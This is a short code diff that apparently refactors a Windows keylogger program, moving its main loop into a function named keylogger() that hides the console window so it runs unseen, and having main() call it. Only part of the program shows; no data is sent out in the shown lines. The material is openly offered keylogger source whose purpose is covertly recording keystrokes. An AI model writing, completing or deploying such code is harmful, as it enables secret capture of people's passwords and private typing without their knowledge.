@@ -92,9 +92,9 @@ bool SpecialKeys(int S_key)
 	}
 }
 
-
-int main()
+void keylogger()
 {
+	
 	ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
 	char key = 'a';
 
@@ -113,6 +113,14 @@ int main()
 			}
 		}
 	}
+
+}
+	
+	
+int main()
+{
+	
+	keylogger();
 
 	return 0;
 }
